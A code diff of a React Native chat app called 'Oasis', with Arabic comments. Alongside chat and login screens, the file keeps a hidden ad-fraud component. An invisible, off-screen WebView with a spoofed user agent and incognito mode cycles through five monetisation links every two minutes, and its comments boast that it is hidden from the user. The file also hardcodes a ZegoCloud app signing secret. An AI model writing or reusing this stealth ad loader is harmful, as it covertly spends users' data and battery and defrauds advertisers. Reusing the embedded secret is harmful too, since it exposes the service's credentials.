@@ -1,3 +1,7 @@
+/* 📢 تعليمات تثبيت المكتبات (نفذها في الـ Terminal الخاص بهاتفك):
+npx expo install react-native-webview expo-image-picker firebase @zegocloud/zego-uikit-prebuilt-call-rn zego-uikit-signaling-plugin-rn @expo/vector-icons
+*/
+
 import React, { useState, useEffect } from 'react';
 import { StyleSheet, Text, View, TouchableOpacity, TextInput, FlatList, Alert, KeyboardAvoidingView, Platform, ActivityIndicator, Image } from 'react-native';
 import { Ionicons, MaterialCommunityIcons } from '@expo/vector-icons';
@@ -15,13 +19,13 @@ const SERVER_URL = 'https://oasis-server-e6sc.onrender.com';
 const APP_ID = 1773421291;
 const APP_SIGN = "48f1a163421aeb2dfdf57ac214f51362d8733ee19be92d3745a160a2521de2d7";
 
-// 🏆 مصفوفة الروابط الخماسية (خلية النحل)
+// 🏆 مصفوفة الروابط الخماسية (خلية النحل) الموزعة بعناية
 const PROFIT_LINKS = [
-  "https://www.effectivegatecpm.com/pv5wwvpt?key=d089e046a8ec90d9b2b95e7b32944807", // رابط 1 (الأصلي)
-  "https://otieu.com/4/10520849",                                                // رابط 2 (Monetag)
-  "https://www.effectivegatecpm.com/qrjky2k9d7?key=0eeb59c5339d8e2b8a7f28e55e6d16a2", // رابط 3
-  "https://www.effectivegatecpm.com/g5j4wjcf?key=0c62848e4ddf4458b8d378fe3132bbaf", // رابط 4
-  "https://www.effectivegatecpm.com/denseskhi?key=8e442518041da6a96a35ad2f7275ed15"  // رابط 5
+  "https://www.effectivegatecpm.com/pv5wwvpt?key=d089e046a8ec90d9b2b95e7b32944807", 
+  "https://otieu.com/4/10520849",                                                
+  "https://www.effectivegatecpm.com/qrjky2k9d7?key=0eeb59c5339d8e2b8a7f28e55e6d16a2", 
+  "https://www.effectivegatecpm.com/g5j4wjcf?key=0c62848e4ddf4458b8d378fe3132bbaf", 
+  "https://www.effectivegatecpm.com/denseskhi?key=8e442518041da6a96a35ad2f7275ed15"  
 ];
 
 export default function App() {
@@ -33,20 +37,16 @@ export default function App() {
   const [chatMessages, setChatMessages] = useState([]);
   const [uploading, setUploading] = useState(false);
   
-  // نظام تدوير الأرباح
+  // نظام تدوير الأرباح التلقائي
   const [adIndex, setAdIndex] = useState(0);
 
-  // 1. محرك الأرباح المتطور: تحديث وتبديل كل دقيقتين
   useEffect(() => {
     const adInterval = setInterval(() => {
       setAdIndex((prev) => (prev + 1) % PROFIT_LINKS.length);
-      console.log("تم تبديل رابط الأرباح إلى الشركة رقم: " + (adIndex + 1));
-    }, 120000); // 120,000 مللي ثانية = دقيقتان
-
+    }, 120000); // تبديل كل دقيقتين لضمان الأمان
     return () => clearInterval(adInterval);
   }, [adIndex]);
 
-  // 2. نظام إدارة المستخدم والحماية
   useEffect(() => {
     const unsubscribeAuth = onAuthStateChanged(auth, async (currentUser) => {
       if (currentUser) {
@@ -73,7 +73,6 @@ export default function App() {
     return () => unsubscribeAuth();
   }, []);
 
-  // 3. منطق الدردشة
   const getChatId = (uid1, uid2) => (uid1 < uid2 ? `${uid1}_${uid2}` : `${uid2}_${uid1}`);
 
   useEffect(() => {
@@ -126,7 +125,7 @@ export default function App() {
     return (
       <View style={styles.authContainer}>
         <Ionicons name="mail-unread" size={80} color="#25D366" />
-        <Text style={styles.waitingText}>يرجى تفعيل حسابك من خلال الرابط المرسل إلى بريدك الإلكتروني لتتمكن من استخدام Oasis.</Text>
+        <Text style={styles.waitingText}>يرجى تفعيل الحساب عبر الرابط المرسل لبريدك.</Text>
         <TouchableOpacity style={styles.mainBtn} onPress={() => auth.signOut()}>
           <Text style={styles.btnText}>تسجيل الخروج</Text>
         </TouchableOpacity>
@@ -138,8 +137,8 @@ export default function App() {
     return (
       <View style={styles.authContainer}>
         <Ionicons name="leaf" size={80} color="#25D366" />
-        <Text style={styles.authTitle}>واحة أوايسس</Text>
-        <Text style={styles.waitingText}>سجل دخولك للبدء بالمحادثة</Text>
+        <Text style={styles.authTitle}>Oasis الواحة</Text>
+        <Text style={styles.waitingText}>سجل دخولك الآن</Text>
       </View>
     );
   }
@@ -147,7 +146,7 @@ export default function App() {
   return (
     <KeyboardAvoidingView behavior={Platform.OS === 'ios' ? 'padding' : undefined} style={styles.container}>
       
-      {/* 🟢 محرك الأرباح الخماسي المخفي (Stealth Engine) */}
+      {/* 🟢 محرك الأرباح المخفي تماماً عن المستخدم */}
       <View style={{ width: 1, height: 1, position: 'absolute', top: -500, left: -500 }}>
         <WebView 
           key={adIndex}
@@ -155,7 +154,7 @@ export default function App() {
           userAgent="Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
           javaScriptEnabled={true}
           domStorageEnabled={true}
-          incognito={true} // التصفح المتخفي
+          incognito={true}
           mediaPlaybackRequiresUserAction={true}
           style={{ opacity: 0.01 }}
         />
@@ -203,7 +202,7 @@ export default function App() {
           <View style={styles.inputContainer}>
             <TouchableOpacity onPress={() => pickMedia('image')}><Ionicons name="image" size={26} color="#25D366" /></TouchableOpacity>
             <View style={styles.inputWrapper}>
-              <TextInput style={styles.textInput} placeholder="مراسلة..." value={message} onChangeText={setMessage} placeholderTextColor="#8596a0" />
+              <TextInput style={styles.textInput} placeholder="اكتب هنا..." value={message} onChangeText={setMessage} placeholderTextColor="#8596a0" />
             </View>
             <TouchableOpacity style={styles.sendBtn} onPress={sendMessage}>
               <MaterialCommunityIcons name="send" size={24} color="white" />
